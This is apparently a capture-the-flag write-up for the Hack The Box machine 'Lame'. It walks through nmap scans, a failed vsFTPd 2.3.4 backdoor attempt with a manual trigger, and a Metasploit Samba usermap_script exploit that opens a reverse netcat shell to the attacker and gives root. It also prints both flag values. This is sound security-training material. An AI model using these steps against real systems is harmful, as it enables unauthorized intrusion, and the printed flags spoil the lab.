# Summary
### 1. NMAP Scan
Typical NMAP scan, reveals FTP `vsFTPd v2.3.4` on Port 21.

### 2. First Attack on FTP
We find out if we can upload to the FTP, but could only do Anonymous Read. We also try attacking with a FTP metasploit module, but did not work.

### 3. Finding another attack vector
We do more NMAP scans but don't find anything. Going down the list from the first NMAP scan, we try an attack for Port 445 `netbios-ssn Samba smbd 3.0.20-Debian`.

### 4. Second attack on Port 445 Samba
SearchSploit reveals it is susceptible to a `Username map script Command Execution` Metasploit module.
We run it and is able to compromise the system.

# Attack
## 1. NMAP Scan
We do our typical NMAP scan!
```
hippoeug@kali:~$ nmap 10.129.137.142 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:24 +08
...
Scanning 10.129.137.142 [1000 ports]
Discovered open port 139/tcp on 10.129.137.142
Discovered open port 21/tcp on 10.129.137.142
Discovered open port 22/tcp on 10.129.137.142
Discovered open port 445/tcp on 10.129.137.142
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m47s, deviation: 2h49m44s, median: 45s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-04-27T18:26:05-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
...
```
The FTP looks interesting, let's try that out first.

## 2. First Attack on FTP
Shows Port 21 FTP Login allowed amongst other opened ports. Let's see if we can first upload a reverse shell.
```
hippoeug@kali:~$ msfconsole
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ftp/anonymous) > set rhost 10.129.137.142
rhost => 10.129.137.142
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 10.129.137.142:21     - 10.129.137.142:21 - Anonymous READ (220 (vsFTPd 2.3.4))
[*] 10.129.137.142:21     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Unfortunately we only get anonymous read access.

Doing `nc 10.10.10.3 21` also confirms it is running `vsFTPd v2.3.4`.
```
hippoeug@kali:~$ nc 10.129.137.142 21
220 (vsFTPd 2.3.4)
```

And `searchsploit vsftpd 2.3.4` shows `Backdoor Command Execution`.
```
hippoeug@kali:~$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                              | unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
One result. Cool, let's try it.
```
hippoeug@kali:~$ msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
...
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.129.137.142
rhosts => 10.129.137.142
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.129.137.142:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.137.142:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
However, the metasploit attack didn't work.

We also try the backdoor manually, but yielded no results.
```
hippoeug@kali:~$ ftp 10.129.137.142
Connected to 10.129.137.142.
220 (vsFTPd 2.3.4)
Name (10.129.137.142:hippoeug): user:)
331 Please specify the password.
Password: [Enter]
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp>
hippoeug@kali:~$ nc -vn 10.129.137.142 6200
(UNKNOWN) [10.129.137.142] 6200 (?) : Connection timed out
```
We were expecting `(UNKNOWN) [192.168.1.142] 6200 (?) open` but it did not appear.

Sources:
- https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
- https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
- https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html

## 3. Finding another attack vector
Our first NMAP scan was useless. Let's try more nmap scans!
```
hippoeug@kali:~$ nmap --script vuln 10.129.137.142 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:27 +08
...
Scanning 10.129.137.142 [1000 ports]
Discovered open port 445/tcp on 10.129.137.142
Discovered open port 139/tcp on 10.129.137.142
Discovered open port 22/tcp on 10.129.137.142
Discovered open port 21/tcp on 10.129.137.142
...
PORT    STATE SERVICE
21/tcp  open  ftp
|_sslv2-drown: 
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
...
```
This didn't yield any results, so going down the list of the first NMAP scan, we try exploits for Port 445 `netbios-ssn Samba smbd 3.0.20-Debian`.

## 4. Second attack on Port 445 Samba
We perform a searchsploit for Samba smbd 3.0.20-Debian with `searchsploit samba 3.0.20`.
```
hippoeug@kali:~$ searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                              | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                    | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                       | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
There are a few interesting choices, but we are going for `Username map script Command Execution` Metasploit module.
Researching it, we find https://securitytrails.com/blog/nmap-vulnerability-scan.

Let's run the metasploit script `use exploit/multi/samba/usermap_script`.
```
hippoeug@kali:~$ msfconsole
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options
...
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.129.137.142
rhosts => 10.129.137.142
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.137.142:53572) at 2021-04-28 06:40:00 +0800

...

pwd
/home/makis
ls
user.txt
cat user.txt
6e66e5335b097cba8de6320509cd6c9e
pwd
/root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
01208cdc186f839cce0ddca1bb8920d6
```
Boom, we got root access (verified with whoami) and found the flags!
